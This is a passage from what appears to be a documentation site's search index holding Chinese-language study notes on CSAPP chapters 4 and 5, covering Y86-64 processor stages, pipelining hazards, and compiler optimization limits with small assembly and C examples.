<li>\u65e2\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u5c06\u6570\u636e\u5199\u5165\u5185\u5b58</li> </ul> </li> <li>\u5199\u56de\u9636\u6bb5 Write Back<ul> <li>\u4e0e\u8bd1\u7801\u9636\u6bb5\u76f8\u53cd\uff0c\u5c06\u6570\u636e\u5199\u5165\u5bc4\u5b58\u5668\u5806\u4e2d</li> </ul> </li> <li>\u66f4\u65b0PC Update<ul> <li>\u5c06PC\u8bbe\u7f6e\u6210\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740</li> </ul> </li> </ul> <p>\u5e76\u4e0d\u662f\u6240\u6709\u6307\u4ee4\u6267\u884c\u90fd\u8981\u7ecf\u8fc7\u4e0a\u8ff0\u516d\u4e2a\u9636\u6bb5</p> <p>\u4f8b\u5982\uff0c\u5904\u7406\u5668\u5904\u7406\u4e00\u4e2a\u51cf\u6cd5\u6307\u4ee4\u7684\u5177\u4f53\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <p></p> <ul> <li>Fetch: \u51cf\u6cd5\u6307\u4ee4\u7684\u4e24\u4e2a\u64cd\u4f5c\u6570\u90fd\u4e3a\u5bc4\u5b58\u5668\uff0c\u56e0\u6b64\u53ef\u4ee5\u7b97\u51fa\u5f53\u524d\u6307\u4ee4\u7684\u957f\u5ea6\u4e3a 2 bytes</li> <li>Decode: \u6839\u636e\u6307\u4ee4\uff0c\u4ece\u5bc4\u5b58\u5668\u5806\u4e2d\u8bfb\u53d6\u5bc4\u5b58\u5668\u6570\u636e</li> <li>Execute: ALU \u6839\u636e\u8bfb\u53d6\u7684\u6570\u636e\u6267\u884c\u7b97\u6570\u903b\u8f91\u8fd0\u7b97\uff0c\u5e76\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\u6761\u4ef6\u7801\u5bc4\u5b58\u5668 <code>CC</code></li> <li>Memory: \u7531\u4e8e\u8be5\u6307\u4ee4\u4e0d\u9700\u8981\u8bfb\u5199\u5185\u5b58\uff0c\u56e0\u6b64\u8bbf\u5b58\u9636\u6bb5\u6ca1\u6709\u4efb\u4f55\u64cd\u4f5c</li> <li>Write Back: \u5199\u56de\u9636\u6bb5\u5c06 ALU \u7684\u8fd0\u7b97\u7ed3\u679c\u5199\u56de\u5230\u5bc4\u5b58\u5668 <code>%rbx</code> </li> <li>Update: \u6700\u540e\u5bf9\u7a0b\u5e8f\u8ba1\u6570\u5668 <code>PC</code> \u8fdb\u884c\u66f4\u65b0</li> </ul>"},{"location":"Accumulation/CSAPP/Chapter4/#y86-64_2","title":"Y86-64 \u5904\u7406\u5668\u786c\u4ef6\u7ed3\u6784","text":"<p>\u8be5\u8282\u5185\u5bb9\u4e3a\u4ecb\u7ecd\u5904\u7406\u5668\u6267\u884c\u6307\u4ee4\u5404\u4e2a\u9636\u6bb5\u7684\u786c\u4ef6\u5b9e\u73b0 </p> <ul> <li>Fetch\uff1a\u53d6\u6307\u9636\u6bb5\u4ee5\u7a0b\u5e8f\u8ba1\u6570\u5668(PC)\u7684\u503c\u4f5c\u4e3a\u8d77\u59cb\u5730\u5740\uff0c\u6bcf\u6b21\u4ece\u6307\u4ee4\u5185\u5b58\u4e2d\u53d6\u5341\u4e2a\u5b57\u8282<ul> <li>\u53d6\u5341\u4e2a\u5b57\u8282\uff0c\u662f\u56e0\u4e3a\u5728\u53d6\u6307\u64cd\u4f5c\u524d\u65e0\u6cd5\u5224\u65ad\u6307\u4ee4\u7684\u957f\u5ea6</li> <li>\u6839\u636e\u6307\u4ee4\u4ee3\u7801 icode \u5224\u65ad\u662f\u5426\u5408\u6cd5\u3001\u6307\u4ee4\u957f\u5ea6\u7b49</li> </ul> </li> </ul> <p></p> <ul> <li>Decode\uff1a\u5728<code>Y86-64</code>\u5904\u7406\u5668\u4e2d\uff0c\u5bc4\u5b58\u5668\u5806\u6709\u4e24\u4e2a\u8bfb\u7aef\u53e3<code>srcA</code>\u548c<code>srcB</code>\uff0c\u652f\u6301\u540c\u65f6\u8fdb\u884c\u4e24\u4e2a\u8bfb\u64cd\u4f5c<ul> <li>\u5176\u4e2d\u8981\u8bfb\u53d6\u7684\u5bc4\u5b58\u5668\u7684 ID \u503c\u9700\u8981\u6839\u636e\u6307\u4ee4\u4ee3\u7801 icode \u4ee5\u53ca\u5bc4\u5b58\u5668\u6307\u793a\u503c <code>rA</code> \u548c <code>rB</code> \u6765\u5224\u65ad</li> <li>\u4e3a\u4ec0\u4e48\u9700\u8981 icode \uff1f\u56e0\u4e3a\u90e8\u5206\u6307\u4ee4\u53ea\u8981\u4e00\u4e2a\u5bc4\u5b58\u5668ID\uff0c\u5982<code>push</code>\u9700\u8981\u6808\u9876\u6307\u9488\u5bc4\u5b58\u5668<code>%rsp</code></li> </ul> </li> </ul> <p></p> <ul> <li>Execute\uff1a\u6267\u884c\u9636\u6bb5\u7684\u6838\u5fc3\u90e8\u4ef6\u4e3a\u7b97\u6570\u903b\u8f91\u5355\u5143 ALU<ul> <li>ALU \u6839\u636e\u6307\u4ee4\u529f\u80fd ifun \u6765\u5224\u65ad\u5806\u8f93\u5165\u7684\u64cd\u4f5c\u6570\u8fdb\u884c\u4f55\u79cd\u8fd0\u7b97</li> <li>\u6bcf\u6b21\u8fd0\u884c\u65f6\uff0cALU \u90fd\u4f1a\u4ea7\u751f\u4e09\u4e2a\u4e0e\u6761\u4ef6\u7801\u76f8\u5173\u7684\u4fe1\u53f7\u2014\u2014\u96f6\u3001\u7b26\u53f7\u3001\u6ea2\u51fa</li> <li>\u56fe\u4e2d <code>setCC</code>\u6a21\u5757\u4f1a\u6839\u636e\u6307\u4ee4\u4ee3\u7801 icode \u6765\u63a7\u5236\u662f\u5426\u8981\u66f4\u65b0\u6761\u4ef6\u7801\u5bc4\u5b58\u5668</li> <li><code>cond</code> \u786c\u4ef6\u5355\u5143\u7528\u6765\u4ea7\u751f <code>cnd</code> \u4fe1\u53f7\uff0c\u5bf9\u4e8e\u8df3\u8f6c\u6307\u4ee4\uff0c\u5982\u679c <code>cnd=1</code> \uff0c\u90a3\u4e48\u6267\u884c\u8df3\u8f6c\uff1b<code>cnd=0</code> \uff0c\u5219\u4e0d\u6267\u884c\u8df3\u8f6c</li> </ul> </li> </ul> <p></p> <ul> <li>Memory\uff1a\u5982\u56fe\u6240\u793a\uff0c\u6839\u636e\u56fe\u4e2d\u7684\u5404\u4e2a\u6a21\u5757\u8fdb\u884c\u5185\u5b58\u7684\u8bfb\u5199<ul> <li>\u8bbf\u5b58\u9636\u6bb5\u7684\u6700\u540e\u64cd\u4f5c\u4f1a\u6839\u636e\u56fe\u4e2d\u7684\u4fe1\u53f7\u8ba1\u7b97\u72b6\u6001\u7801 <code>Stat</code></li> </ul> </li> </ul> <p></p> <ul> <li>Write Back\uff1a\u5199\u5165\u9636\u6bb5\u5373\u5c06\u6570\u636e\u5199\u5165\u5bc4\u5b58\u5668\u5806\u4e2d\uff0c\u4e24\u4e2a\u5199\u7aef\u53e3\u5206\u522b\u4e3a <code>M</code> \u548c <code>E</code>\uff0c\u5bf9\u5e94\u7684\u5730\u5740\u8f93\u5165\u4e3a <code>dstE</code> \u548c <code>dstM</code> <ul> <li>\u5982\u679c\u6267\u884c\u7684\u662f\u6761\u4ef6\u4f20\u9001\u6307\u4ee4 <code>cmov</code> \uff0c\u5199\u5165\u64cd\u4f5c\u8fd8\u9700\u8981\u5224\u65ad\u6267\u884c\u9636\u6bb5\u8ba1\u7b97\u51fa\u7684 <code>cnd</code> \u4fe1\u53f7\uff0c\u82e5\u4e0d\u6ee1\u8db3\u6761\u4ef6\uff0c\u5219\u5c06\u76ee\u7684\u5bc4\u5b58\u5668\u8bbe\u7f6e\u4e3a <code>0xF</code> \u6765\u7981\u6b62\u5199\u5165\u5bc4\u5b58\u5668\u6587\u4ef6</li> </ul> </li> </ul> <p></p> <ul> <li>Update\uff1a\u6700\u540e\u66f4\u65b0 PC \u7684\u503c\uff0c\u5206\u4e3a\u4e09\u79cd\u60c5\u51b5<ul> <li>\u5982\u679c\u5f53\u524d\u6267\u884c <code>call</code> \uff0c\u90a3\u4e48\u65b0\u7684 PC \u5c31\u7b49\u4e8e <code>call</code> \u7684\u5e38\u6570\u5b57\u6bb5</li> <li>\u5982\u679c\u5f53\u524d\u6267\u884c <code>ret</code> \uff0c\u6307\u4ee4 <code>ret</code> \u5728\u8bbf\u5b58\u9636\u6bb5\u4f1a\u4ece\u5185\u5b58(\u6808)\u4e2d\u8bfb\u51fa\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u4e2a\u8fd4\u56de\u5730\u5740\u5c31\u662f\u65b0\u7684 PC \u503c</li> <li>\u5982\u679c\u5f53\u524d\u6267\u884c\u8df3\u8f6c\u6307\u4ee4 <code>jxx</code> \uff0c\u90a3\u4e48\u5f53 <code>cnd</code> \u4fe1\u53f7\u4e3a 1 \u7684\u65f6\u5019\uff0c\u65b0\u7684 PC \u5c31\u7b49\u4e8e\u5e38\u6570\u5b57\u6bb5\uff1b\u5f53\u4e0d\u6ee1\u8db3\u8df3\u8f6c\u6761\u4ef6\u65f6\uff0c\u8df3\u8f6c\u6307\u4ee4\u548c\u5176\u5b83\u6307\u4ee4\u4e00\u6837\uff0c\u65b0\u7684 PC \u5c31\u7b49\u4e8e\u5f53\u524d PC \u7684\u503c\u52a0\u4e0a\u5f53\u524d\u6307\u4ee4\u7684\u957f\u5ea6</li> </ul> </li> </ul> <p></p> <p>\u4ee5\u4e0a\u987a\u5e8f\u7ed3\u6784\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff1a\u6307\u4ee4\u6267\u884c\u901f\u5ea6\u592a\u6162\uff0c\u96be\u4ee5\u5728\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u5b8c\u6210\u6240\u6709\u64cd\u4f5c</p>"},{"location":"Accumulation/CSAPP/Chapter4/#_2","title":"\u6d41\u6c34\u7ebf","text":""},{"location":"Accumulation/CSAPP/Chapter4/#_3","title":"\u57fa\u672c\u539f\u7406\u4e0e\u8bbe\u8ba1","text":"<p>\u4e00\u6761\u6307\u4ee4\u6267\u884c\u7684\u6d41\u6c34\u56fe</p> <p></p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u65f6\u949f\u9a71\u52a8\u7684\u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668\uff0c\u4ec5\u5728\u65f6\u949f\u4e0a\u5347\u6cbf\u52a0\u8f7d\u8f93\u5165</p> <p>\u5047\u8bbe\u4e00\u6761\u6307\u4ee4\u6267\u884c\u9700\u8981\u7ecf\u8fc7\u4e09\u90e8\u5206\u7ec4\u5408\u903b\u8f91\u7535\u8def\uff0c\u4e14\u6bcf\u90e8\u5206\u7ec4\u5408\u903b\u8f91\u7535\u8def\u548c\u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668\u7684\u5ef6\u8fdf\u5982\u4e0b\uff0c\u90a3\u4e48\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u4e3a 120ps \uff0c\u4e14\u4e00\u6761\u6307\u4ee4\u6267\u884c\u9700\u8981 3 \u4e2a\u65f6\u949f\u5468\u671f</p> <p></p> <p>\u7b2c\u4e00\u6761\u6307\u4ee4\u7ecf\u8fc7\u7ec4\u5408\u903b\u8f91\u7535\u8defA\u540e\u817e\u51fa\u4e86\u7a7a\u4f4d\u7ed9\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u7531\u6b64\u53ef\u4ee5\u6784\u9020\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u6d41\u6c34\u7ebf\uff0c\u5176\u541e\u5410\u91cf\u76f8\u6bd4\u539f\u6765\u7684\u541e\u5410\u91cf\u63d0\u9ad8 2.67 \u500d</p> <p></p> <p>\u4e0a\u8ff0\u5b9e\u73b0\u662f\u4e00\u4e2a\u7406\u60f3\u7684\u6d41\u6c34\u7ebf\u7cfb\u7edf\uff0c\u5b9e\u9645\u4e0a\u4f1a\u6709\u4e00\u4e9b\u56e0\u7d20\u5f71\u54cd\u6d41\u6c34\u7ebf\u7684\u6548\u7387\u3002</p> <ul> <li>\u5bf9\u4e8e\u786c\u4ef6\u8bbe\u8ba1\u8005\u6765\u8bb2\uff0c\u5c06\u4e00\u4e2a\u6574\u4f53\u7684\u8bbe\u8ba1\u5212\u5206\u4e3a\u591a\u4e2a\u5ef6\u8fdf\u90fd\u76f8\u7b49\u7684\u5b50\u9636\u6bb5\u662f\u4e00\u4e2a\u4e25\u5cfb\u7684\u6311\u6218\uff0c\u90a3\u4e48\u65f6\u949f\u7684\u5468\u671f\u5c31\u53d7\u6700\u6162\u9636\u6bb5\u7684\u5ef6\u8fdf\u6765\u9650\u5236</li> <li>\u53e6\u5916\uff0c\u5982\u679c\u628a\u4e00\u4e2a\u6307\u4ee4\u7684\u6267\u884c\u8fc7\u7a0b\u5212\u5206\u4e3a\u66f4\u591a\u7684\u5b50\u9636\u6bb5\uff0c\u867d\u7136\u7406\u8bba\u4e0a\u7cfb\u7edf\u7684\u541e\u5410\u91cf\u63d0\u5347\u4e86\uff0c\u4f46\u662f\u8fc7\u6df1\u7684\u6d41\u6c34\u7ebf\u4e5f\u4f1a\u5bfc\u81f4\u7cfb\u7edf\u6027\u80fd\u7684\u4e0b\u964d</li> </ul> <p>\u4ee5\u4e0b\u662f\u4e4b\u524d\u8bb2\u89e3\u8fc7\u7684 <code>Y86-64</code> \u7684\u786c\u4ef6\u5b9e\u73b0\uff0c\u5176\u4ee5\u8bfb\u53d6 PC \u4e3a\u5f00\u59cb\uff0c\u4ee5\u5411\u66f4\u65b0 PC \u4e3a\u7ed3\u675f\uff0c\u4e3a \u987a\u5e8f\u7ed3\u6784 \u3002\u5bf9\u4e8e\u5f53\u524d\u7684\u987a\u5e8f\u7ed3\u6784\uff0c\u6240\u6709\u9636\u6bb5\u7684\u64cd\u4f5c\u90fd\u8981\u5728\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u5185\u5b8c\u6210</p> <p></p> <p>\u4e3a\u4e86\u5c06 <code>Y86-64</code> \u6307\u4ee4\u7cfb\u7edf\u6539\u9020\u4e3a\u6d41\u6c34\u7ebf\u7ed3\u6784\uff0c\u9996\u5148\u5c06 PC \u7684\u66f4\u65b0\u79fb\u52a8\u81f3\u6240\u6709\u9636\u6bb5\u7684\u6700\u524d\u9762\uff0c\u5bf9\u4e8e\u66f4\u65b0 PC \u6240\u9700\u8981\u7684\u5404\u4e2a\u6570\u636e\uff0c\u5f53\u5b83\u4eec\u4ea7\u751f\u540e\u76f4\u63a5\u4f20\u5165 PC \u524d\u7684\u5bc4\u5b58\u5668\u5185\uff0c\u7528\u6765\u4fdd\u5b58 PC \u7684\u9884\u6d4b\u503c(\u5982\u4f55\u9884\u6d4b\u5730\u5740\uff0c\u540e\u9762\u7ae0\u8282\u4f1a\u6709\u8bb2\u89e3)\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u8981\u5c06\u6bcf\u4e2a\u5b50\u9636\u6bb5\u524d\u8bbe\u7f6e\u4e00\u4e2a\u5bc4\u5b58\u5668\u7528\u6765\u4fdd\u5b58\u72b6\u6001(\u56fe\u4e2d <code>F</code>,<code>D</code>,<code>E</code>,<code>M</code>,<code>W</code>)</p> <p></p>"},{"location":"Accumulation/CSAPP/Chapter4/#_4","title":"\u5192\u9669","text":"<p>\u7531\u4e8e\u6307\u4ee4\u4e0e\u6307\u4ee4\u4e4b\u95f4\u53ef\u80fd\u5b58\u5728\u6570\u636e\u76f8\u5173\u6216\u662f\u63a7\u5236\u76f8\u5173\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4ea7\u751f\u4e86\u9519\u8bef\u7684\u8ba1\u7b97\u7ed3\u679c\uff0c\u8fd9\u79cd\u60c5\u51b5\u5373\u79f0\u4e4b\u4e3a \u5192\u9669 (\u6216\u8005\u51b2\u7a81)</p>"},{"location":"Accumulation/CSAPP/Chapter4/#_5","title":"\u6570\u636e\u5192\u9669","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u6307\u4ee4\uff0c\u9700\u8981\u524d\u9762\u6307\u4ee4\u4fee\u6539\u8fc7\u540e\u7684\u5bc4\u5b58\u5668\uff0c\u8fd9\u79cd\u60c5\u51b5\u79f0\u4e3a\u6570\u636e\u76f8\u5173\u3002\u907f\u514d\u6570\u636e\u5192\u9669\uff0c\u9996\u5148\u60f3\u5230\u7684\u662f\u6682\u505c\u8be5\u6307\u4ee4\u7684\u6267\u884c\u3002</p> <pre><code>irmovq $3, %rbx\nirmovq $4, %rbp\naddq %rbx, %rbp\nhalt\n</code></pre> <p></p> <p>\u4e0a\u56fe\uff0c<code>addq</code>\u7684\u4e24\u4e2a\u64cd\u4f5c\u6570\u9700\u8981\u5148\u7531\u524d\u4e24\u4e2a\u6307\u4ee4\u8bbe\u7f6e\uff0c\u5176\u8bd1\u7801\u9636\u6bb5\u9700\u8981\u63a8\u8fdf\u5230\u4e0a\u9762\u4e24\u4e2a\u6307\u4ee4\u5199\u5165\u9636\u6bb5\u7ed3\u675f\u540e\u3002\u6682\u505c\u4e4b\u540e\uff0c\u901a\u8fc7\u63d2\u5165\u6c14\u6ce1(bubble)\u6765\u4ee3\u66ff\u6682\u505c\u6307\u4ee4\u7684\u6307\u4ee4\uff0c\u6c14\u6ce1\u4e0d\u4f1a\u6539\u53d8\u5bc4\u5b58\u5668\u3001\u5185\u5b58\u3001\u6761\u4ef6\u7801\u4ee5\u53ca\u7a0b\u5e8f\u72b6\u6001</p> <p>\u867d\u7136\u4f7f\u7528\u6682\u505c\u6280\u672f\u53ef\u4ee5\u89e3\u51b3\u6570\u636e\u5192\u9669\uff0c\u4f46\u662f\u57fa\u4e8e\u8fd9\u79cd\u673a\u5236\u5b9e\u73b0\u7684\u6d41\u6c34\u7ebf\u6027\u80fd\u5e76\u4e0d\u9ad8\uff0c\u8fd9\u662f\u56e0\u4e3a\u7a0b\u5e8f\u4e2d \u6570\u636e\u76f8\u5173 \u7684\u60c5\u51b5\u975e\u5e38\u591a\uff0c\u9891\u7e41\u6682\u505c\u6307\u4ee4\u6267\u884c\u4f1a\u4e25\u91cd\u964d\u4f4e\u6d41\u6c34\u7ebf\u7684\u541e\u5410\u91cf\u3002</p> <p>\u6570\u636e\u8f6c\u53d1</p> <p>\u53e6\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u5728\u524d\u7f6e\u6570\u636e\u8fdb\u5165\u5bc4\u5b58\u5668\u5806\u524d\uff0c\u5c31\u5c06\u5176\u4f20\u8f93\u5230<code>addq</code>\u7684\u8bd1\u7801\u9636\u6bb5\u8fdb\u884c\u8fd0\u7b97\uff0c\u5373 \u6570\u636e\u8f6c\u53d1</p> <p>\u6570\u636e\u8f6c\u53d1\u7684\u5b9e\u73b0\u9700\u8981\u5728\u57fa\u672c\u7684\u786c\u4ef6\u7ed3\u6784\u4e2d\u589e\u52a0\u4e00\u4e9b\u989d\u5916\u7684\u6570\u636e\u8fde\u63a5\u548c\u63a7\u5236\u903b\u8f91\uff0c\u8fd9\u4f7f\u5f97\u6d41\u6c34\u7ebf\u53ef\u4ee5\u4e0d\u6682\u505c\u5c31\u80fd\u5904\u7406\u5927\u591a\u6570\u60c5\u51b5\u7684\u6570\u636e\u5192\u9669</p>"},{"location":"Accumulation/CSAPP/Chapter4/#_6","title":"\u63a7\u5236\u5192\u9669","text":"<p>\u5728\u6d41\u6c34\u7ebf\u7684\u8bbe\u8ba1\u4e2d\uff0c\u6211\u4eec\u671f\u671b\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u90fd\u80fd\u5b8c\u6210\u4e00\u6761\u6307\u4ee4\u7684\u6267\u884c\uff0c\u4e3a\u6b64\uff0c\u6d41\u6c34\u7ebf\u5728\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u90fd\u8981\u53d6\u5230\u4e00\u6761\u6307\u4ee4\uff0c\u56e0\u6b64\uff0c\u6bcf\u4e00\u6b21\u53d6\u6307\u64cd\u4f5c\u540e\uff0c\u5fc5\u987b\u9a6c\u4e0a\u786e\u5b9a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002</p> <p>\u4f46\u662f\u5f53\u9047\u5230\u8fd4\u56de\u6307\u4ee4 <code>ret</code> \u65f6\uff0c\u6d41\u6c34\u7ebf\u9700\u8981\u7b49\u5230\u8bbf\u5b58\u9636\u6bb5\u7ed3\u675f\u540e\u624d\u80fd\u4ece\u6808\u4e2d\u53d6\u5f97\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff1b\u5f53\u9047\u5230\u5206\u652f\u6307\u4ee4 <code>jxx</code> \u65f6\uff0c\u6d41\u6c34\u7ebf\u9700\u8981\u7b49\u5230\u6267\u884c\u9636\u6bb5\u540e\u624d\u80fd\u51b3\u5b9a\u662f\u5426\u6267\u884c\u8df3\u8f6c\u64cd\u4f5c\uff0c\u6b64\u5373\u63a7\u5236\u5192\u9669</p> <p>\u5bf9\u4e8e\u89e3\u51b3\u65b9\u6cd5\uff0c\u540c\u6837\u53ef\u4ee5\u91c7\u53d6\u6682\u505c\u5904\u7406\u65b0\u6307\u4ee4\uff0c\u5e76\u63d2\u5165 Bubble \u7684\u65b9\u6cd5\u6765\u907f\u514d\u3002</p> <p>\u5206\u652f\u6307\u4ee4 <code>jxx</code> \u6709\u5176\u72ec\u7279\u7684\u5904\u7406\u65b9\u5f0f\uff0c\u53ef\u4ee5\u9884\u5148\u5047\u5b9a\u4e00\u79cd\u7b56\u7565\uff0c\u9884\u8bbe\u5206\u652f\u7684\u7ed3\u679c\u603b\u662f\u8df3\u8f6c\u6216\u662f\u4e0d\u8df3\u8f6c\uff0c\u5373 \u5206\u652f\u9884\u6d4b ,\u5206\u652f\u9884\u6d4b\u7684\u51c6\u786e\u6027\u5bf9\u7a0b\u5e8f\u7684\u6027\u80fd\u6709\u975e\u5e38\u5927\u7684\u5f71\u54cd\u3002\u63a5\u4e0b\u6765\u4e3e\u4e00\u4e2a\u9047\u5230\u5206\u652f\u6307\u4ee4\uff0c\u603b\u662f\u8df3\u8f6c\u6267\u884c\u7684\u4f8b\u5b50\uff1a</p> <pre><code>0x000:   xorq %rax, %rax\n0x002:   jne target\n0x00b:   irmovq $1, %rax\n0x015:   halt\n0x016: target:\n0x016:   irmovq $2, %rdx\n0x020:   irmovq $3, %rbx\n0x02a:   halt\n</code></pre> <p>\u5f53\u8df3\u8f6c\u6307\u4ee4 <code>jne</code> \u8fd0\u884c\u5230\u6267\u884c\u9636\u6bb5\uff0c\u6839\u636e\u6267\u884c\u7ed3\u679c\u53d1\u73b0\u4e0d\u5e94\u8be5\u6267\u884c\u8df3\u8f6c\uff0c\u8981\u7acb\u5373\u7ec8\u6b62 <code>target</code> \u4e2d\u4e24\u6761 <code>irmovq</code> \u6307\u4ee4\u7684\u8fd0\u884c\uff0c\u65b9\u6cd5\u662f\u5c06\u5b83\u4eec\u5269\u4f59\u7684\u8fd0\u884c\u9636\u6bb5\u4f5c\u4e3a Bubble \u63d2\u5165</p> <p></p> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u6d41\u6c34\u7ebf\u5b9e\u73b0\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u5192\u9669\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u6682\u505c\u548c\u63d2\u5165\u6c14\u6ce1\u6765\u5b9e\u73b0\u3002\u6682\u505c\u548c\u63d2\u5165\u6c14\u6ce1\u7684\u64cd\u4f5c\u53ef\u4ee5\u901a\u8fc7\u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668\u7684\u8f93\u5165 <code>stall</code> \u548c <code>bubble</code> \u6765\u63a7\u5236\uff1a</p> <p></p>"},{"location":"Accumulation/CSAPP/Chapter5/","title":"CH 5. \u4f18\u5316\u7a0b\u5e8f\u6027\u80fd","text":""},{"location":"Accumulation/CSAPP/Chapter5/#chapter-5-optimizing-program-performance","title":"Chapter 5. Optimizing Program Performance","text":"<p> \u7ea6 666 \u4e2a\u5b57  58 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>\u7f16\u5199\u9ad8\u6548\u7684\u7a0b\u5e8f</p> <ul> <li>\u9009\u62e9\u5408\u9002\u7684\u7b97\u6cd5\u548c\u6570\u636e\u7ed3\u6784</li> <li>\u7406\u89e3\u7f16\u8bd1\u5668\u7684\u80fd\u529b\u4e0e\u5c40\u9650\u6027</li> <li>\u4f7f\u7528\u5e76\u884c\u5316</li> </ul>"},{"location":"Accumulation/CSAPP/Chapter5/#_1","title":"\u4f18\u5316\u7a0b\u5e8f\u6027\u80fd","text":""},{"location":"Accumulation/CSAPP/Chapter5/#_2","title":"\u7f16\u8bd1\u5668\u4f18\u5316\u7684\u5c40\u9650\u6027","text":"<p>\u5185\u5b58\u522b\u540d\u5f15\u7528</p> <p> \u51fd\u6570 <code>add1</code> \u8fd0\u884c\u8fc7\u7a0b\u9700\u8981\u8bfb\u5199\u516d\u6b21\u5185\u5b58\uff1b\u51fd\u6570 <code>add2</code> \u53ea\u9700\u8981\u8bfb\u5199\u4e09\u6b21\u5185\u5b58\u3002\u4e4d\u4e00\u770b <code>add2</code> \u662f <code>add1</code> \u7684\u4f18\u5316\u5199\u6cd5\uff0c\u5b9e\u9645\u4e0a\uff0c\u82e5\u6307\u9488 <code>xp</code> \u548c <code>yp</code> \u90fd\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u4e8c\u8005\u529f\u80fd\u662f\u4e0d\u4e00\u6837\u7684\u3002</p> <p>\u6211\u4eec\u5c06\u4e24\u4e2a\u6307\u9488\u53ef\u80fd\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u4f4d\u7f6e\u7684\u60c5\u51b5\u79f0\u4e3a\u5185\u5b58\u522b\u540d\u5f15\u7528</p> <p>More Example\uff1a</p> <pre><code>x = 1000;\ny = 3000;\n*p = x;\n*q = y;\nanswer = *p;\n</code></pre> <p>\u7f16\u8bd1\u5668\u65e0\u6cd5\u786e\u5b9a\u4e24\u4e2a\u6307\u9488\u662f\u5426\u6307\u5411\u540c\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u56e0\u6b64\u4e0d\u4f1a\u5bf9\u5176\u8fdb\u884c\u4f18\u5316</p> <pre><code>long f();\n\nlong function1(){\n    return f()+f()+f()+f();\n}\n\nlong function2(){\n    return 4 * f();\n}\n</code></pre> <p>\u6bcf\u6b21\u8c03\u7528 <code>f()</code> \u7684\u8fd4\u56de\u503c\u53ef\u80fd\u4e0d\u76f8\u540c\uff0c\u56e0\u6b64\u7f16\u8bd1\u5668\u4e5f\u4e0d\u4f1a\u5c06\u51fd\u6570 <code>function1</code> \u4f18\u5316\u6210 <code>function2</code></p>"},{"location":"Accumulation/CSAPP/Chapter5/#_3","title":"\u7a0b\u5e8f\u7ed3\u6784\u7684\u4f18\u5316","text":"<p>\u7531\u4e8e\u7f16\u8bd1\u5668\u7684\u4f18\u5316\u5e76\u4e0d\u662f\u7279\u522b\u6fc0\u8fdb\uff0c\u6240\u4ee5\u9700\u8981\u7a0b\u5e8f\u5458\u82b1\u8d39\u66f4\u591a\u7684\u7cbe\u529b\u6765\u7f16\u5199\u9ad8\u8d28\u91cf\u7684\u4ee3\u7801</p> <p>\u8bbe\u60f3\u6709\u4e00\u4e2a\u5411\u91cf <code>a</code> \uff0c\u9700\u8981\u8ba1\u7b97\u5176\u524d\u7f6e\u548c\u5e76\u5b58\u5165\u5411\u91cf <code>p</code> \u4e2d\uff0c\u53ef\u4ee5\u60f3\u5230\u7684\u4e00\u4e2a\u8f83\u4e3a\u9ad8\u6548\u7684\u5b9e\u73b0\u65b9\u6cd5\u4e3a\uff1a</p> <pre><code>void method1(float a[], float p[], long n){\n    long i = 0;\n    p[0] = a[0];\n    for(i=1;i&lt;n;i++)\n        p[i] = p[i-1] + a[i];\n}\n</code></pre> <p>\u4e0d\u8fc7\u8fd8\u6709\u66f4\u52a0\u9ad8\u6548\u7684\u5b9e\u73b0\u65b9\u6cd5\uff1a</p> <pre><code>void method2(float a[], float p[], long n){\n    long i = 0;\n    p[0] = a[0];\n    for(i=1;i&lt;n-1;i+=2){\n        float mid_val = p[i-1] + a[i];\n        p[i] = mid_val;\n        p[i+1] = mid_val + a[i+1];\n    }\n}\n</code></pre> <p>\u8fd9\u79cd\u4f18\u5316\u65b9\u5f0f\u79f0\u4e3a \u5faa\u73af\u5c55\u5f00  (\u8bbf\u95ee\u5411\u91cf <code>p</code> \u7684\u6b21\u6570\u51cf\u5c11\u4e86)</p> <p>\u63a5\u4e0b\u6765\u770b\u53e6\u5916\u4e00\u4e2a\u7a0b\u5e8f\u4f18\u5316\u4f8b\u5b50\uff1a</p> <p>\u5b9a\u4e49\u4e00\u4e2a\u5411\u91cf\u7ed3\u6784\u4f53\uff0c\u5176\u7ed3\u6784\u5305\u542b\u5411\u91cf\u957f\u5ea6 <code>len</code> \u53ca\u6570\u636e <code>data</code></p> <pre><code>#define IDENT 0;\n#define OP +;\ntypedef int data_t;\n\ntypedef struct {\n    long len;\n    data_t *data;\n} vec_rec, *vec_ptr;\n</code></pre> <p>\u7ed9\u51fa\u5176\u539f\u59cb\u51fd\u6570\uff0c\u7528\u6765\u8ba1\u7b97\u5176\u548c\uff1a</p> <pre><code>void combine1(vec_ptr v, data_t *dest){\n    long i;\n    *dest = IDENT;\n    for(i = 0;i &lt; vec_length(v); i++ ){\n    